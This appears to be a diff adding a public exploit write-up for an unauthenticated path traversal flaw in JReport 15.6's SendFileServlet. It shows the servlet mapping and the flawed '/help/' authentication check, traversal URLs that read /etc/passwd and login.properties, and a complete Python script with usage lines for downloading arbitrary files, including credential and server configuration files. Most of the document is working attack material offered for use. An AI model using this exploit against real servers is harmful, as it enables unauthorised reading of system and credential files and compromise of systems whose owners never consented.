@@ -1,0 +1,91 @@
+# Exploit Title: Jinfornet Jreport 15.6 - Unauthenticated Directory Traversal
+# Date: 2020-03-26
+# Exploit Author: hongphukt
+# Vendor Homepage: https://www.jinfonet.com/
+# Software Link: https://www.jinfonet.com/product/download-jreport/
+# Version: JReport 15.6
+# Tested on: Linux, Windows 
+
+Jreport Help function have a path traversal vulnerability in the SendFileServlet allows remote unauthenticated users to view any files on the Operating System with Application services user permission. This vulnerability affects Windows and Unix operating systems.
+Technical Details
+
+Jreport before loggedin have help function with url:
+
+https://serverip/jreport/sendfile/help/userguide/server/index.htm
+
+senfile url processing by jet.server.servlets.SendFileServlet class.
+
+            <servlet>
+
+                        <servlet-name>sendfile</servlet-name>
+
+                        <servlet-class>jet.server.servlets.SendFileServlet</servlet-class>
+
+            </servlet>
+
+            <servlet-mapping>
+
+                        <servlet-name>sendfile</servlet-name>
+
+                        <url-pattern>/sendfile/*</url-pattern>
+
+            </servlet-mapping>
+
+ 
+
+In jet.server.servlets.SendFileServlet class, request will go on when it’s authenticated or start url by ‘/help/’
+
+if ((!isAuthentic) &&
+
+        (!path.startsWith("/help/")))
+
+      {
+
+        httpRptServer.getHttpUserSessionManager().sendUnauthorizedResponse(req, res, this.D, httpRptServer.getResourceManager().getRealm());
+
+        return;
+
+      }
+
+ 
+
+So the function reading file without any path validation
+
+Exploit:
+
+Get login properties, /etc/password file by get url:
+
+ http://jreport.test/jreport/sendfile/help/../bin/login.properties
+
+ http://jreport.test/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd
+
+# Exploit Code
+
+import requests
+import argparse
+
+def exploit(url, file):
+    
+    session = requests.Session()
+    rawBody = "\r\n"
+    response = session.get("{}/jreport/sendfile/help/{}".format(url,file), data=rawBody)
+
+    if response.status_code == 404:
+        print("The '{}' file was not found.".format(file))	
+    else:
+        print("-" *22)
+        print(response.content)
+        print("-" *22)
+
+if __name__ == "__main__":
+
+    parser = argparse.ArgumentParser(description='Jreport Path traversal & Arbitrary File Download')
+    parser.add_argument('-u', action="store", dest="url", required=True, help='Target URL')
+    parser.add_argument('-f', action="store", dest="file", required=True, help='The file to download')
+    args = parser.parse_args()
+
+    exploit(args.url, args.file)
+
+# python jreport_fileread.py -u http://jreport.address -f "../../../../../../../../../../../../../../etc/passwd/"
+# python jreport_fileread.py -u http://jreport.address -f "../bin/login.properties"
+# python jreport_fileread.py -u http://jreport.address -f "../bin/server.properties"
